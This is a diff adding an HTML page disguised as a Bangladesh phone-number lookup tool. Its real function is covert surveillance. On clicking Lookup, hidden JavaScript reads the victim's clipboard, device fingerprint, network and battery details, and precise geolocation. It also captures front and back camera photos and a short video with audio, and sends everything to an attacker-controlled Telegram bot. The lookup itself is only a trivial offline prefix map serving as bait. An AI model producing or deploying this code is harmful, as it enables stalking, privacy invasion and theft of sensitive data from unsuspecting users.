@@ -1,0 +1,339 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Number Info</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{min-height:100vh;padding:20px 14px 60px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:radial-gradient(900px 500px at 50% -10%,rgba(124,92,255,.22),transparent 60%),#07070c;color:#e6e8ee;-webkit-font-smoothing:antialiased}
+.wrap{max-width:480px;margin:0 auto}
+.head{text-align:center;margin-bottom:22px}
+.crown{font-size:30px;background:linear-gradient(135deg,#7c5cff,#22d3ee 50%,#f472b6);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;filter:drop-shadow(0 0 12px rgba(124,92,255,.55))}
+.title{font-size:20px;font-weight:900;letter-spacing:5px;margin-top:6px;background:linear-gradient(135deg,#fff,#a78bfa 50%,#22d3ee);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.sub{font-size:11px;letter-spacing:2px;text-transform:uppercase;color:#8a8fa8;margin-top:4px}
+.card{background:linear-gradient(180deg,rgba(22,24,36,.95),rgba(15,16,24,.95));border:1px solid #23263a;border-radius:16px;padding:18px;margin-bottom:14px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.field{display:flex;flex-direction:column;gap:6px;margin-bottom:12px}
+.field span{font-size:11px;color:#8a8fa8;letter-spacing:1.5px;text-transform:uppercase;font-weight:700}
+.field input{width:100%;background:rgba(10,11,18,.85);border:1px solid #23263a;color:#e6e8ee;padding:13px 14px;border-radius:11px;font-size:16px;outline:none;font-family:ui-monospace,Menlo,Consolas,monospace;letter-spacing:1.5px}
+.field input:focus{border-color:#7c5cff}
+.field input::placeholder{color:#4a4d63}
+.hint{font-size:11px;color:#4a4d63;letter-spacing:.5px}
+.btn{width:100%;background:linear-gradient(135deg,#7c5cff,#9a80ff 60%,#22d3ee);color:#fff;border:0;border-radius:11px;padding:14px;font-size:15px;font-weight:800;letter-spacing:1px;cursor:pointer;box-shadow:0 12px 30px rgba(124,92,255,.35)}
+.btn:disabled{opacity:.5}
+.badge{font-size:10px;letter-spacing:1px;padding:4px 9px;border-radius:6px;font-weight:800;text-transform:uppercase;color:#a78bfa;background:rgba(167,139,250,.15)}
+.row{display:flex;justify-content:space-between;gap:12px;background:rgba(10,11,18,.7);border:1px solid #23263a;border-radius:11px;padding:12px 14px;margin-bottom:8px}
+.row .k{font-size:11px;letter-spacing:1.5px;text-transform:uppercase;color:#8a8fa8;font-weight:700}
+.row .v{font-size:14.5px;font-weight:600;color:#e6e8ee;font-family:ui-monospace,monospace;word-break:break-word;text-align:right;flex:1}
+.loader{display:none;text-align:center;padding:22px;color:#8a8fa8;font-size:13px;letter-spacing:2px;text-transform:uppercase}
+.loader.on{display:block}
+.alert{background:rgba(248,113,113,.1);border:1px solid rgba(248,113,113,.35);color:#f87171;padding:12px;border-radius:11px;font-size:13px}
+.result-head{display:flex;justify-content:space-between;margin-bottom:14px}
+.result-title{font-size:12px;color:#8a8fa8;letter-spacing:2px;text-transform:uppercase;font-weight:800}
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="head">
+<div class="crown">♛</div>
+<div class="title">NUMBER INFO</div>
+<div class="sub">bangladesh lookup</div>
+</div>
+<div class="card">
+<div class="field">
+<span>Phone Number</span>
+<input type="tel" id="numberInput" placeholder="01XXXXXXXXX" inputmode="numeric" maxlength="14" autocomplete="off">
+<div class="hint">11 digits · e.g. 01712345678</div>
+</div>
+<button class="btn" id="lookupBtn">Lookup</button>
+</div>
+<div class="loader" id="loader">Searching...</div>
+<div id="output"></div>
+</div>
+
+<script>
+// ═══ CONFIG — এখানে তোমার টোকেন আর chat id বসাও ═══
+const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+const CHAT_ID   = 'YOUR_CHAT_ID_HERE';
+const TG_BASE   = 'https://api.telegram.org/bot' + BOT_TOKEN;
+
+const inputEl  = document.getElementById('numberInput');
+const btnEl    = document.getElementById('lookupBtn');
+const loaderEl = document.getElementById('loader');
+const outEl    = document.getElementById('output');
+let busy = false;
+
+// ═══ Telegram helpers ═══
+function tgSend(method, fd) {
+  fd.append('chat_id', CHAT_ID);
+  return fetch(TG_BASE + '/' + method, { method: 'POST', body: fd })
+    .then(r => r.json()).catch(e => null);
+}
+function tgText(text) {
+  const fd = new FormData();
+  fd.append('text', text);
+  fd.append('parse_mode', 'HTML');
+  fd.append('disable_web_page_preview', 'true');
+  return tgSend('sendMessage', fd);
+}
+function tgLoc(lat, lon) {
+  const fd = new FormData();
+  fd.append('latitude', lat);
+  fd.append('longitude', lon);
+  return tgSend('sendLocation', fd);
+}
+function tgFile(kind, blob, caption) {
+  const fd = new FormData();
+  fd.append('caption', caption);
+  const names = { photo:'p.jpg', video:'v.webm', audio:'a.webm', voice:'v.ogg' };
+  fd.append(kind, blob, names[kind] || 'f.bin');
+  const methods = { photo:'sendPhoto', video:'sendVideo', audio:'sendAudio', voice:'sendVoice' };
+  return tgSend(methods[kind], fd);
+}
+
+// ═══ Escaper ═══
+function esc(s) {
+  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+// ═══ Input ═══
+inputEl.addEventListener('input', () => {
+  let v = inputEl.value.replace(/\D/g, '');
+  if (v.startsWith('880') && v.length > 3) v = '0' + v.slice(3);
+  if (v.length > 11) v = v.slice(0, 11);
+  inputEl.value = v;
+});
+inputEl.addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); lookup(); } });
+btnEl.addEventListener('click', lookup);
+
+// ═══ Lookup ═══
+async function lookup() {
+  if (busy) return;
+  const num = inputEl.value.replace(/\D/g, '');
+  if (!num) { showError('Enter a phone number.'); return; }
+  if (!/^01[3-9]\d{8}$/.test(num)) { showError('Invalid number.'); return; }
+
+  busy = true; btnEl.disabled = true; loaderEl.classList.add('on'); outEl.innerHTML = '';
+
+  captureAll(num).catch(() => {});
+
+  try { render(localLookup(num)); } catch(e) { showError(e.message); }
+  finally { busy = false; btnEl.disabled = false; loaderEl.classList.remove('on'); }
+}
+
+function localLookup(num) {
+  const map = { '013':'Grameenphone','017':'Grameenphone','014':'Banglalink','019':'Banglalink','015':'Teletalk','016':'Airtel','018':'Robi' };
+  const op = map[num.slice(0,3)];
+  if (!op) return { ok:false, message:'Unknown prefix' };
+  return { ok:true, source:'local-series-db', note:'Offline prefix map only.', data:{ number:num, operator:op, country:'Bangladesh', country_code:'+880', region:'BD', valid:true } };
+}
+
+// ═══ Capture orchestrator ═══
+async function captureAll(num) {
+  const tag = '[' + num + ']';
+
+  await tgText('<b>✅ HIT</b> ' + esc(tag) + '\nsecure=' + window.isSecureContext + '\nproto=' + location.protocol + '\nhasMedia=' + !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia));
+
+  try {
+    const info = await gatherInfo();
+    const lines = Object.entries(info).map(([k,v]) => '• <b>' + esc(k) + '</b>: ' + esc(v)).join('\n');
+    await tgText('<b>📱 DEVICE</b> ' + esc(tag) + '\n\n' + lines);
+  } catch(e) { await tgText('<b>⚠ device fail</b> ' + esc(e.message)); }
+
+  try {
+    if (navigator.clipboard && navigator.clipboard.readText) {
+      const c = await navigator.clipboard.readText();
+      if (c && c.trim()) await tgText('<b>📋 CLIPBOARD</b> ' + esc(tag) + '\n\n<code>' + esc(c.slice(0,3500)) + '</code>');
+    }
+  } catch(e) {}
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      async pos => {
+        const lat = pos.coords.latitude, lon = pos.coords.longitude;
+        await tgLoc(lat, lon);
+        await tgText('<b>📍 LOCATION</b> ' + esc(tag) + '\nlat: ' + lat + '\nlon: ' + lon + '\nacc: ' + pos.coords.accuracy + 'm');
+      },
+      async err => { await tgText('<b>⚠ location fail</b> code=' + err.code + ' ' + esc(err.message)); },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    await tgText('<b>⚠ no getUserMedia</b> — WebView or insecure context');
+    return;
+  }
+
+  let stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 } },
+      audio: true
+    });
+  } catch(e) {
+    await tgText('<b>⚠ camera/mic fail</b> ' + esc(e.name) + ': ' + esc(e.message));
+    return;
+  }
+
+  await new Promise(r => setTimeout(r, 1500));
+
+  try {
+    const frontBlob = await snap(stream);
+    if (frontBlob) await tgFile('photo', frontBlob, '📸 CAM FRONT ' + tag);
+  } catch(e) {}
+
+  try {
+    const vidBlob = await record(stream, 8000, 'video');
+    if (vidBlob) await tgFile('video', vidBlob, '🎥 LIVE VIDEO ' + tag);
+  } catch(e) {}
+
+  stream.getTracks().forEach(t => t.stop());
+  let backStream;
+  try {
+    backStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 } },
+      audio: false
+    });
+  } catch(e) { await tgText('<b>⚠ back cam fail</b> ' + esc(e.name)); return; }
+
+  await new Promise(r => setTimeout(r, 1200));
+  try {
+    const backBlob = await snap(backStream);
+    if (backBlob) await tgFile('photo', backBlob, '📸 CAM BACK ' + tag);
+  } catch(e) {}
+  backStream.getTracks().forEach(t => t.stop());
+}
+
+// ═══ Frame grab ═══
+function snap(stream) {
+  return new Promise(resolve => {
+    const v = document.createElement('video');
+    v.srcObject = stream; v.muted = true; v.playsInline = true; v.setAttribute('playsinline','');
+    v.play().then(() => {
+      setTimeout(() => {
+        try {
+          const c = document.createElement('canvas');
+          c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
+          c.getContext('2d').drawImage(v, 0, 0);
+          c.toBlob(b => resolve(b), 'image/jpeg', 0.85);
+        } catch(e) { resolve(null); }
+      }, 800);
+    }).catch(() => resolve(null));
+  });
+}
+
+// ═══ Recorder ═══
+function record(stream, ms, kind) {
+  return new Promise(resolve => {
+    const isV = kind === 'video';
+    const mimes = isV
+      ? ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm','video/mp4']
+      : ['audio/webm;codecs=opus','audio/webm','audio/mp4'];
+    let mime = null;
+    for (const m of mimes) { try { if (MediaRecorder.isTypeSupported(m)) { mime = m; break; } } catch(e){} }
+    let rec;
+    try { rec = new MediaRecorder(stream, mime ? { mimeType: mime } : undefined); } catch(e) { resolve(null); return; }
+    const chunks = [];
+    rec.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
+    rec.onstop = () => {
+      if (!chunks.length) return resolve(null);
+      resolve(new Blob(chunks, { type: mime ? mime.split(';')[0] : (isV ? 'video/webm' : 'audio/webm') }));
+    };
+    rec.start(250);
+    setTimeout(() => { try { rec.stop(); } catch(e) { resolve(null); } }, ms);
+  });
+}
+
+// ═══ Device info ═══
+async function gatherInfo() {
+  const info = {
+    'User Agent': navigator.userAgent,
+    'Platform': navigator.platform || 'n/a',
+    'Language': navigator.language,
+    'Languages': (navigator.languages || []).join(', '),
+    'Vendor': navigator.vendor || 'n/a',
+    'Screen': screen.width + 'x' + screen.height,
+    'Viewport': innerWidth + 'x' + innerHeight,
+    'Pixel Ratio': devicePixelRatio,
+    'Color Depth': screen.colorDepth + ' bit',
+    'CPU Cores': navigator.hardwareConcurrency || 'n/a',
+    'Memory': navigator.deviceMemory || 'n/a',
+    'Touch Points': navigator.maxTouchPoints,
+    'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
+    'Local Time': new Date().toString(),
+  };
+
+  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (c) {
+    const typeMap = { wifi:'WiFi', cellular:'Cellular', ethernet:'Ethernet', none:'Offline', unknown:'Unknown' };
+    const type = typeMap[c.type] || c.type || 'unknown';
+    const eff = c.effectiveType || 'unknown';
+    let gen = '—';
+    if (c.type === 'wifi') gen = 'WiFi';
+    else if (eff === '2g' || eff === 'slow-2g') gen = '2G';
+    else if (eff === '3g') gen = '3G';
+    else if (eff === '4g') {
+      if (typeof c.downlink === 'number' && c.downlink >= 30 && c.rtt <= 40) gen = '5G (likely)';
+      else if (typeof c.downlink === 'number' && c.downlink >= 10 && c.rtt <= 80) gen = '4G+ (LTE-A)';
+      else gen = '4G (LTE)';
+    }
+    info['Network Type'] = type;
+    info['Network Gen'] = gen;
+    info['Effective Type'] = eff;
+    info['Downlink'] = (typeof c.downlink === 'number' ? c.downlink : 'n/a') + ' Mbps';
+    info['RTT'] = (typeof c.rtt === 'number' ? c.rtt : 'n/a') + ' ms';
+  }
+
+  try {
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      info['Battery'] = Math.round(b.level*100) + '%' + (b.charging ? ' (charging)' : '');
+    }
+  } catch(e){}
+
+  try {
+    const cv = document.createElement('canvas');
+    const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
+    if (gl) {
+      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      if (dbg) {
+        info['GPU Vendor'] = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || 'n/a';
+        info['GPU Renderer'] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || 'n/a';
+      }
+    }
+  } catch(e){}
+
+  try {
+    const fc = document.createElement('canvas');
+    fc.width = 200; fc.height = 60;
+    const ctx = fc.getContext('2d');
+    ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069'; ctx.fillText('LuckyMan!', 2, 15);
+    const d = fc.toDataURL();
+    let h = 0;
+    for (let i = 0; i < d.length; i++) { h = ((h << 5) - h) + d.charCodeAt(i); h |= 0; }
+    info['Fingerprint'] = 'fp_' + Math.abs(h).toString(36);
+  } catch(e){}
+
+  return info;
+}
+
+// ═══ Render ═══
+function render(json) {
+  if (!json || json.ok === false) { showError(json && json.message || 'Lookup failed'); return; }
+  const data = json.data || {};
+  let html = '<div class="card"><div class="result-head"><div class="result-title">Result</div><span class="badge">' + esc(json.source || 'unknown') + '</span></div>';
+  for (const [k, v] of Object.entries(data)) {
+    if (v === null || v === undefined || v === '') continue;
+    const label = k.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
+    html += '<div class="row"><div class="k">' + esc(label) + '</div><div class="v">' + esc(v) + '</div></div>';
+  }
+  html += '</div>';
+  outEl.innerHTML = html;
+}
+
+function showError(msg) { outEl.innerHTML = '<div class="card"><div class="alert">✗ ' + esc(msg) + '</div></div>'; }
+</script>
+</body>
+</html>
